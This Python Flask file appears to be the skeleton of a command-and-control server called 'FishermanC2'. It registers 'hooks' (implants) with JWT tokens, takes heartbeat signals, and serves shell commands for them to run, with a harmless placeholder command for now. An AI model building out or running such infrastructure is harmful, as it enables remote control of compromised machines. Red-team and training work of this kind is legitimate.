from flask import Flask, jsonify
from db import HookDB
from flask_session import Session
from flask_jwt_extended import create_access_token
from flask_admin import Admin
from models import db, Hook
from views.admin import MyAdminIndexView, HookModelView

import dotenv
import os

dotenv.load_dotenv()

app = Flask(__name__)
app.config.from_pyfile("config.py")

hooksDB = HookDB()
admin = Admin(app, name="Fisherman's Boat", template_mode='bootstrap3', index_view=MyAdminIndexView())

session = Session(app)
db.init_app(app)

with app.app_context():
    db.create_all()

admin.add_view(HookModelView(Hook, db.session))

@app.route('/')
def index():
    return '<h1>FishermanC2</h1>'


@app.route('/hook')
def hook():
    access_token = create_access_token(identity=str(hooksDB.register_hook()))
    return jsonify(access_token=access_token)


@app.route('/alive', methods=['GET'])
def alive():
    app.logger.info(f'Got alive signal')
    return 'ok', 200


@app.route('/command', methods=['POST'])
def bait():
    return jsonify(command='echo "Hello World"')




